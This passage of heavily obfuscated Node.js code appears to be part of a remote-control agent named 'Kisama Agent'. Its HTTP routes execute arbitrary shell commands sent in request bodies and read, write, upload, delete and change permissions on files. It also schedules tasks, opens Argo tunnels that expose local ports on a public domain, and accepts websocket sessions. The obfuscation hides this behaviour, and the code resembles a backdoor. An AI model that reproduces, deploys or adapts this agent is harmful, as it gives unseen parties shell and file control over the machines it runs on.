                })), await a0K[ex(0x403)]) : a0A[ex(0x48b)](b['qdCOy']);
                const q = { ...a0K[ex(0x2f8)] };
                n[ex(0x170)](q);
            } catch (r) {
                n[ex(0x609)](0x1f4)[ex(0x170)]({
                    'status': b[ex(0x45c)],
                    'message': r['message']
                });
            }
        }), i[ep(0x355)](b[ep(0x30c)], async (m, n) => {
            const eA = ep;
            try {
                let o = null;
                if (b[eA(0x2a8)](typeof m[eA(0x42a)], 'string'))
                    o = m[eA(0x42a)]['trim']();
                else
                    m[eA(0x42a)] && b[eA(0x1b8)](typeof m[eA(0x42a)], b[eA(0xc9)]) && (o = m[eA(0x42a)][eA(0x2a7)] || '');
                if (!o)
                    return n[eA(0x609)](0x190)[eA(0x170)]({
                        'status': b[eA(0x45c)],
                        'message': b['KRluM']
                    });
                const p = await a0P['execute'](o, {
                    'cwd': m[eA(0x42a)][eA(0x391)],
                    'env': m[eA(0x42a)]['env'],
                    'timeout': a0K[eA(0x4d2)]
                });
                n['json'](p);
            } catch (q) {
                n[eA(0x609)](0x1f4)[eA(0x170)]({
                    'status': b[eA(0x45c)],
                    'message': q[eA(0x3f8)]
                });
            }
        }), i[ep(0x355)](b[ep(0x49a)], async (m, n) => {
            const eB = ep;
            try {
                const o = await a0Q[eB(0x4ff)](m[eB(0x42a)][eB(0x52a)], m[eB(0x42a)][eB(0x3e2)]);
                n[eB(0x170)]({
                    'status': 'ok',
                    'count': o[eB(0x3d0)],
                    'files': o
                });
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': b[eB(0x45c)],
                    'message': p[eB(0x3f8)]
                });
            }
        }), i[ep(0x355)](b['SVWDL'], async (m, n) => {
            const eC = ep;
            try {
                const o = await a0Q['getFilePermissions'](m['body']['paths'] || []);
                n[eC(0x170)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n['status'](0x1f4)[eC(0x170)]({
                    'status': b['JPVkP'],
                    'message': p[eC(0x3f8)]
                });
            }
        }), i[ep(0x200)](b[ep(0x133)], async (m, n) => {
            const eD = ep;
            try {
                const o = m['body'][eD(0x62a)] || {}, p = b[eD(0x5d3)](m['body'][eD(0x3e2)], !![]), q = await a0Q['setFilePermissions'](o, p);
                n[eD(0x170)](q);
            } catch (r) {
                n[eD(0x609)](0x1f4)[eD(0x170)]({
                    'status': b['JPVkP'],
                    'message': r[eD(0x3f8)]
                });
            }
        }), i['post'](b[ep(0x575)], async (m, n) => {
            const eE = ep;
            try {
                const o = await a0Q[eE(0x5f5)](m[eE(0x42a)]['path']);
                n[eE(0x170)](o);
            } catch (p) {
                n[eE(0x609)](0x1f4)['json']({
                    'status': 'error',
                    'message': p[eE(0x3f8)]
                });
            }
        }), i[ep(0x355)](b[ep(0x494)], async (m, n) => {
            const eF = ep;
            try {
                const o = await a0Q['uploadFile'](m['body']['path'], m['body']['filename'], m[eF(0x42a)][eF(0x148)], m[eF(0x42a)][eF(0x626)], m[eF(0x42a)][eF(0x216)]);
                n['json'](o);
            } catch (p) {
                n[eF(0x609)](0x1f4)[eF(0x170)]({
                    'status': b[eF(0x45c)],
                    'message': p[eF(0x3f8)]
                });
            }
        }), i[ep(0x355)](b['SEQGu'], a0f[ep(0x2a4)]({
            'type': b[ep(0x283)],
            'limit': b[ep(0x3dc)]
        }), async (m, n) => {
            const eG = ep;
            try {
                const o = decodeURIComponent(m[eG(0x4b5)][b[eG(0x5fe)]] || ''), p = b[eG(0x352)](decodeURIComponent, m[eG(0x4b5)][eG(0x3bb)] || ''), q = m[eG(0x4b5)][b['PvJwI']], r = m['headers'][b[eG(0x68e)]];
                if (!o || !p)
                    return n['status'](0x190)['json']({
                        'status': eG(0xdc),
                        'completed': ![],
                        'message': b[eG(0x21f)]
                    });
                const s = b['qrkVk'](q, undefined) ? parseInt(b[eG(0x245)](String, q), 0xa) : null, t = b[eG(0x2ac)](r, undefined) ? b['zYzos'](parseInt, String(r), 0xa) : null, u = m[eG(0x42a)];
                if (!Buffer[eG(0x184)](u))
                    return n[eG(0x609)](0x190)[eG(0x170)]({
                        'status': b[eG(0x45c)],
                        'completed': ![],
                        'message': b[eG(0x63a)]
                    });
                const v = await a0Q['uploadFileRaw'](o, p, u, s, t);
                n[eG(0x170)](v);
            } catch (w) {
                n[eG(0x609)](0x1f4)['json']({
                    'status': eG(0xdc),
                    'completed': ![],
                    'message': w[eG(0x3f8)]
                });
            }
        }), i[ep(0x355)](b['xMBSZ'], async (m, n) => {
            const eH = ep;
            try {
                const o = await a0Q[eH(0x17b)](m[eH(0x42a)][eH(0x52a)]), p = Buffer[eH(0x613)](o['content'], eH(0x68a));
                return n['set'](b['CNVdr'], o[eH(0x18b)][eH(0x406)]()), n[eH(0x521)](b[eH(0x532)], o[eH(0x52a)]), n['set'](b[eH(0x146)], 'application/octet-stream'), n['send'](p);
            } catch (q) {
                n['status'](0x1f4)['json']({
                    'status': b['JPVkP'],
                    'message': q[eH(0x3f8)]
                });
            }
        }), i[ep(0xeb)](b[ep(0x494)], async (m, n) => {
            const eI = ep;
            try {
                let o = m[eI(0x42a)][eI(0x131)];
                if (!o || !Array[eI(0x1d4)](o)) {
                    o = [];
                    if (m[eI(0x42a)]['path'])
                        o['push'](m[eI(0x42a)][eI(0x52a)]);
                    if (m[eI(0x42a)][eI(0x64c)])
                        o[eI(0x6aa)](m[eI(0x42a)][eI(0x64c)]);
                }
                const p = await a0Q[eI(0x5b5)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)[eI(0x170)]({
                    'status': b[eI(0x45c)],
                    'message': q['message']
                });
            }
        }), i['put'](b[ep(0x494)], async (m, n) => {
            const eJ = ep;
            try {
                const o = await a0Q[eJ(0xfe)](m['body'][eJ(0x67b)] || m[eJ(0x42a)]);
                n[eJ(0x170)]({
                    'status': 'ok',
                    'total': o[eJ(0x3d0)],
                    'success': o[eJ(0x6ba)](p => p['status'] === 'ok')['length'],
                    'results': o
                });
            } catch (p) {
                n[eJ(0x609)](0x1f4)[eJ(0x170)]({
                    'status': 'error',
                    'message': p[eJ(0x3f8)]
                });
            }
        }), i[ep(0x355)](ep(0xd7), async (m, n) => {
            const eK = ep;
            try {
                const o = await a0Q['copyFiles'](m['body']);
                n['json']({
                    'status': 'ok',
                    'total': o[eK(0x3d0)],
                    'success': o[eK(0x6ba)](p => p[eK(0x609)] === 'ok')[eK(0x3d0)],
                    'results': o
                });
            } catch (p) {
                n[eK(0x609)](0x1f4)[eK(0x170)]({
                    'status': eK(0xdc),
                    'message': p[eK(0x3f8)]
                });
            }
        }), i[ep(0x355)](b[ep(0x1fe)], async (m, n) => {
            const eL = ep;
            try {
                const o = await a0Q[eL(0x11b)](m[eL(0x42a)]['path']);
                n['json'](o);
            } catch (p) {
                n[eL(0x609)](0x1f4)['json']({
                    'status': b[eL(0x45c)],
                    'message': p[eL(0x3f8)]
                });
            }
        }), i[ep(0x327)]('/api/task/onetime', (m, n) => {
            const eM = ep;
            n['json'](a0R[eM(0x564)]());
        }), i[ep(0x355)](ep(0x48c), async (m, n) => {
            const eN = ep;
            try {
                const o = await a0R['setOnetimeTasks'](m['body']);
                n['json'](o);
            } catch (p) {
                n[eN(0x609)](0x1f4)[eN(0x170)]({
                    'status': b[eN(0x45c)],
                    'message': p['message']
                });
            }
        }), i[ep(0x327)](b[ep(0x4e8)], (m, n) => {
            const eO = ep;
            n[eO(0x170)](a0R[eO(0xdb)]());
        }), i[ep(0x355)](b[ep(0x4e8)], (m, n) => {
            const eP = ep;
            try {
                const o = a0R[eP(0x605)](m[eP(0x42a)]);
                n[eP(0x170)](o);
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': b[eP(0x45c)],
                    'message': p[eP(0x3f8)]
                });
            }
        }), i[ep(0x327)](b[ep(0x510)], (m, n) => {
            const eQ = ep;
            n['json'](a0R[eQ(0x3e0)]());
        }), i[ep(0x327)](b['IjYic'], (m, n) => {
            const eR = ep;
            let o = b[eR(0x3a9)](parseInt, m['query'][eR(0x190)], 0xa) || 0x32;
            o = Math[eR(0x3c1)](Math[eR(0x183)](o, 0x1), 0x64), n['json'](a0R[eR(0x5d8)](o));
        }), i[ep(0x327)](b['naFsL'], (m, n) => {
            const eS = ep;
            let o = b['zYzos'](parseInt, m[eS(0x6b1)][eS(0x190)], 0xa) || 0x32;
            o = Math[eS(0x3c1)](Math['max'](o, 0x1), 0x64), n[eS(0x170)](a0R[eS(0x6bc)](o));
        }), i[ep(0xeb)](b['IjYic'], (m, n) => {
            const eT = ep;
            n[eT(0x170)](a0R[eT(0x25d)]());
        }), i['delete']('/api/task/log/cron', (m, n) => {
            const eU = ep;
            n[eU(0x170)](a0R['clearCronLogs']());
        }), i['get'](b[ep(0x62b)], (m, n) => {
            const eV = ep;
            n[eV(0x170)](a0R[eV(0x535)]());
        }), i['post'](ep(0x30f), async (m, n) => {
            const eW = ep;
            try {
                const o = await a0R['executeOnetimeTasks']();
                n[eW(0x170)](o);
            } catch (p) {
                n[eW(0x609)](0x1f4)[eW(0x170)]({
                    'status': b['JPVkP'],
                    'message': p[eW(0x3f8)]
                });
            }
        });
        const j = {
                'debug': (...m) => a0A['debug'](m[ep(0x64a)]('\x20')),
                'info': (...m) => a0A['info'](m[ep(0x64a)]('\x20')),
                'warning': (...m) => a0A[ep(0xd5)](m[ep(0x64a)]('\x20'))
            }, k = new a0ay(j);
        i[ep(0x327)](ep(0x266), (m, n) => {
            const eX = ep, o = k[eX(0x244)]();
            n['json']({
                'status': 'ok',
                'count': o[eX(0x3d0)],
                'tunnels': o
            });
        }), i[ep(0x355)](b[ep(0xe5)], async (m, n) => {
            const eY = ep;
            try {
                const o = b[eY(0x4d4)](a0ax, m[eY(0x42a)]);
                let p = o[eY(0x1b6)];
                (p === undefined || b[eY(0x1b8)](p, null) || b[eY(0x5d3)](p, '')) && (p = a0K[eY(0x1ef)]);
                const q = Number(p);
                if (!Number['isInteger'](q) || b[eY(0x548)](q, 0x1) || b['ximXw'](q, 0xffff))
                    return n[eY(0x609)](0x1a6)[eY(0x170)]({
                        'status': b[eY(0x45c)],
                        'created': ![],
                        'port': p,
                        'message': b[eY(0x2df)]
                    });
                const r = await k[eY(0x66a)](q, b['gUNir'](o[eY(0x4e3)], !![]));
                n[eY(0x170)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r['tunnelDomain'],
                    'port': r[eY(0x1b6)],
                    'created_at': r['createdAt']
                });
            } catch (s) {
                n[eY(0x609)](s[eY(0x609)] || 0x1f4)['json']({
                    'status': b['JPVkP'],
                    'created': ![],
                    'port': s[eY(0x1b6)] ?? null,
                    'message': s[eY(0x3f8)]
                });
            }
        }), i[ep(0xeb)](b[ep(0xe5)], async (m, n) => {
            const eZ = ep;
            try {
                const o = b[eZ(0x652)](a0ax, m['body']), p = o[eZ(0x1b6)], q = b['MFbCE'](Number, p);
                if (b[eZ(0x556)](p, undefined) || b[eZ(0x402)](p, null) || b['aEneH'](p, '') || !Number[eZ(0x4d5)](q) || b[eZ(0x453)](q, 0x1) || b[eZ(0x509)](q, 0xffff))
                    return n[eZ(0x609)](0x1a6)[eZ(0x170)]({
                        'status': b['JPVkP'],
                        'deleted': 0x0,
                        'port': b[eZ(0x505)](p, null),
                        'message': 'port\x20is\x20required\x20and\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535'
                    });
                const r = await k[eZ(0x562)](q, o['tunnel_domain']);
                if (b[eZ(0x2a8)](r[eZ(0x609)], 'ok'))
                    return n[eZ(0x170)]({
                        'status': 'ok',
                        'deleted': r['deleted'],
                        'port': q,
                        'tunnels': r[eZ(0x589)]
                    });
                return n[eZ(0x609)](r[eZ(0x609)])[eZ(0x170)]({
                    'status': b[eZ(0x45c)],
                    'deleted': 0x0,
                    'port': q,
                    'message': r['message']
                });
            } catch (s) {
                n[eZ(0x609)](0x1f4)[eZ(0x170)]({
                    'status': 'error',
                    'deleted': 0x0,
                    'message': s['message']
                });
            }
        }), a0A[ep(0x48b)](ep(0x65b)), i['ws'](b['cCVpN'], async (m, n) => {
            const f0 = ep, o = n[f0(0x411)][0x0];
            a0A[f0(0x48b)](f0(0x441) + n['url']), a0A[f0(0x48b)](f0(0x697) + o);
            const p = n[f0(0x6b1)][f0(0x52e)], q = n[f0(0x6b1)][f0(0x57e)];
            a0A[f0(0x48b)](f0(0xe9) + p);
            if (!p) {
                a0A[f0(0x48b)](b[f0(0x3a6)]), m[f0(0x107)](0x3f0, b[f0(0x59c)]);
                return;
            }
            const r = new a0aE();
            await r[f0(0x4c6)](m, p, q);
        }), a0A[ep(0x48b)](b['JbGQN']), a0A[ep(0x48b)](b[ep(0x1a7)]);
        const l = i[ep(0x612)](a0K[ep(0x1ef)], a0K['HOST'], () => {
            const f1 = ep;
            a0A[f1(0x48b)]('🚀\x20Kisama\x20Agent\x20Node.js\x20v' + a0K[f1(0x447)] + f1(0x31e) + a0K['HOST'] + ':' + a0K['PORT']), a0A['debug'](b[f1(0x325)]);
        });
        process['on'](b['ntgOd'], () => {
            const f2 = ep;
            a0A[f2(0x48b)](b[f2(0x38f)]), l[f2(0x107)](), process[f2(0x3e4)](0x0);
        }), a0A[ep(0x48b)](ep(0x598));
    } catch (m) {
        a0A['error'](b[ep(0x34b)], m), process['exit'](0x1);
    }
}
(require['main'] === module || require[a0aI(0x4a7)]?.[a0aI(0x3a3)]?.['includes'](a0aI(0x343))) && a0aF()[a0aI(0x5fd)](a0A[a0aI(0xdc)]);
module[a0aI(0x1f7)] = {
    'main': a0aF,
    'Config': a0K,
    'CryptoManager': a0M,
    'SystemInfoCollector': a0O,
    'CommandExecutor': a0P,
    'FileManager': a0Q,
    'TaskManager': a0R,
    'ArgoTunnelManager': a0ay
};